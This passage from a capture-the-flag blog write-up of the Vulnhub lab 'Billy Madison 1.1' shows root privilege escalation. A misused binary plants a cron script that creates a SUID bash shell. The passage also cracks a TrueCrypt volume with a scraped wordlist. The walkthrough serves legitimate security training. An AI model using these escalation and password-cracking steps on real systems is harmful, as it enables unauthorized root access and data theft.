+</pre></table></code></div></div><ul><li>Able to specify 2 paths</ul><li><code class="language-plaintext highlighter-rouge">/usr/local/share/sgml/donpcgd</code> allows us to create a file that has the same permissions as <code class="language-plaintext highlighter-rouge">path1</code> anywhere<ul><li><code class="language-plaintext highlighter-rouge">path1</code>: file created will have the same permission as the specified file.<li><code class="language-plaintext highlighter-rouge">path2</code>: path where you want the file to be created<li>The file created is empty</ul><li>Test our theory<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre> eric@BM:/tmp$ ls -l /etc/passwd
+ -rw-r--r-- 1 root root 1717 Aug 20  2016 /etc/passwd # take note of the permission
+
+ eric@BM:/tmp$ /usr/local/share/sgml/donpcgd /etc/passwd /tmp/testing1
+ #### mknod(/tmp/testing1,81a4,0)
+
+ eric@BM:/tmp$ ls -la
+ total 920
+ ...
+ -rw-r--r--  1 root root      0 Feb 22 02:08 testing1 # same permissions as /etc/passwd
+ ...
+</pre></table></code></div></div><li>Obtain root by creating a writable file at <code class="language-plaintext highlighter-rouge">/etc/cron.hourly</code>, that will create a root shell.<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre> eric@BM:/tmp$ touch /tmp/test
+ eric@BM:/tmp$ /usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/rootbash
+ #### mknod(/etc/cron.hourly/rootbash,81b4,0)
+ eric@BM:/tmp$  ls -l /etc/cron.hourly
+ total 0
+ -rw-rw-r-- 1 eric eric 0 Feb 22 04:25 rootbash
+ eric@BM:/tmp$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash\n' &gt; /etc/cron.hourly/rootbash; chmod 4777 /etc/cron.hourly/rootbash
+ eric@BM:/tmp$ ls -l /etc/cron.hourly
+ total 4
+ -rwsrwxrwx 1 eric eric 67 Feb 22 04:26 rootbash
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220224020112.png" alt="" data-proofer-ignore></p><li>Wait for cronjob to execute<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> eric@BM:/tmp$ ls -la
+ total 4944
+ ...
+ -rw-r--r--  1 root root       0 Feb 22 01:24 passwd
+ -rwxrwxr-x  1 eric eric 3078592 Feb 22 03:00 pspy64
+ -rwsr-xr-x  1 root root 1037528 Feb 22 05:17 rootbash
+ ...
+</pre></table></code></div></div><li>Obtain root<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> eric@BM:/tmp$ /tmp/rootbash -p
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220224025933.png" alt="" data-proofer-ignore></p></ol><h1 id="private---crack-truecrypt-volume">/PRIVATE - Crack Truecrypt Volume</h1><ol><li>View files in <code class="language-plaintext highlighter-rouge">/PRIVATE/</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> root@BM:/PRIVATE# ls -la
+ total 1036
+ drwx------  2 root  root     4096 Aug 29  2016 .
+ drwxr-xr-x 25 root  root     4096 Feb 22 01:32 ..
+ -rw-rw-r--  1 billy billy 1048576 Aug 21  2016 BowelMovement
+ -rw-r--r--  1 root  root      221 Aug 29  2016 hint.txt
+ root@BM:/PRIVATE# 
+</pre></table></code></div></div><li>View files<ul><li><code class="language-plaintext highlighter-rouge">hint.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>  root@BM:/PRIVATE# cat hint.txt 
+  Heh, I called the file BowelMovement because it has the same initials as
+  Billy Madison.  That truely cracks me up!  LOLOLOL!
+
+  I always forget the password, but it's here:
+
+  https://en.wikipedia.org/wiki/Billy_Madison
+
+  -EG
+  root@BM:/PRIVATE# 
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">That truely cracks me up!</code></ul><li><code class="language-plaintext highlighter-rouge">BowelMovement</code><ul><li>Truecrypt volume, based on <code class="language-plaintext highlighter-rouge">hint.txt</code>, <code class="language-plaintext highlighter-rouge">truely cracks me up!</code></ul></ul><li>Create a wordlist from the wikipedia link<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
+ └─# cewl https://en.wikipedia.org/wiki/Billy_Madison -w wiki.txt -d 0 -v
+</pre></table></code></div></div><li>Crack <code class="language-plaintext highlighter-rouge">BowelMovement</code> w/ truecrack<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
+ └─# truecrack -t BowelMovement -w ../exploit/wiki.txt 
+ TrueCrack v3.6
+ Website: https://github.com/lvaccaro/truecrack
+ Contact us: infotruecrack@gmail.com
+ Found password:		"execrable"
+ Password length:	"10"
+ Total computations:	"744"
+</pre></table></code></div></div><li>Download <code class="language-plaintext highlighter-rouge">veracrypt</code> to mount <code class="language-plaintext highlighter-rouge">BowelMovement</code><ol><li>Download <code class="language-plaintext highlighter-rouge">veracrypt-1.25.9-setup.tar.bz2</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> wget https://launchpad.net/veracrypt/trunk/1.25.9/+download/veracrypt-1.25.9-setup.tar.bz2
+</pre></table></code></div></div><li>Extract<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> tar -xf veracrypt-1.25.9-setup.tar.bz2
+</pre></table></code></div></div><li>Run setup<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> ./veracrypt-1.25.9-setup-console-x64
+</pre></table></code></div></div></ol><li>Mount <code class="language-plaintext highlighter-rouge">BowelMovement</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
+ └─# mkdir billy
+ ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
+ └─# veracrypt -tc BowelMovement billy
+ Enter password for /root/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/BowelMovement: 
+ Enter keyfile [none]: 
+ Protect hidden volume (if any)? (y=Yes/n=No) [No]: n
+</pre></table></code></div></div><li>View directory structure of <code class="language-plaintext highlighter-rouge">billy</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]
+ └─# tree -a billy/
+ billy/
+ ├── $RECYCLE.BIN
+ │   └── desktop.ini
+ └── secret.zip
+
+ 1 directory, 2 files
+</pre></table></code></div></div><li>Unzip <code class="language-plaintext highlighter-rouge">secret.zip</code><li>View extracted files<ul><li><code class="language-plaintext highlighter-rouge">Billy_Madison_12th_Grade_Final_Project.doc</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220224023455.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">THE-END.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>  ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/billy]
+  └─# cat THE-END.txt 
+  Congratulations!
+
+  If you're reading this, you win!
+
+  I hope you had fun.  I had an absolute blast putting this together.
+
+  I'd love to have your feedback on the box - or at least know you pwned it!
+
+  Please feel free to shoot me a tweet or email (7ms@7ms.us) and let me know with
+  the subject line: "Stop looking at me swan!"
+
+  Thanks much,
+
+  Brian Johnson
+  7 Minute Security
+  www.7ms.us
+</pre></table></code></div></div></ul></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>Vulnhub</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >cryptography</a> <a href="/tags/wireshark/" class="post-tag no-text-decoration" >wireshark</a> <a href="/tags/port-knocking/" class="post-tag no-text-decoration" >port-knocking</a> <a href="/tags/linux-priv-esc-suid-unknown-exec/" class="post-tag no-text-decoration" >linux-priv-esc/suid/unknown-exec</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnhub - Billy Madison 1.1 - Yufong&amp;u=https://yufongg.github.io/posts/Billy-Madison-1.1/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Prime-1/"><div class="card-body"> <em class="timeago small" data-ts="1643385600" > 2022-01-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Prime 1</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Sat Jan 22 00:11:42 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Prime1/192.168.1.103/scans/...</p></div></div></a></div><div class="card"> <a href="/posts/Lord-of-the-Root-1.0.1/"><div class="card-body"> <em class="timeago small" data-ts="1643644800" > 2022-02-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Lord of the Root 1.0.1</h3><div class="text-muted small"><p> Overview This machine begins w/ SSH revealing a port knocking sequence, allowing us to open an additional port TCP/1337 running HTTP. The webpage has a login page that is susceptible to SQLi, allow...</p></div></div></a></div><div class="card"> <a href="/posts/Glasglow-Smile-1.1/"><div class="card-body"> <em class="timeago small" data-ts="1643731200" > 2022-02-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnhub - Glasglow Smile 1.1</h3><div class="text-muted small"><p> Recon NMAP Complete Scan # Nmap 7.92 scan initiated Tue Jan 25 18:30:16 2022 as: nmap -vv --reason -Pn -T4 -sV -p 80 &quot;--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/eLection-1/" class="btn btn-outline-primary" prompt="Older"><p>Vulnhub - eLection 1</p></a> <a href="/posts/Tr0ll-3/" class="btn btn-outline-primary" prompt="Newer"><p>Vulnhub - Tr0ll 3</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Billy-Madison-1.1/'; this.page.identifier = '/posts/Billy-Madison-1.1/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
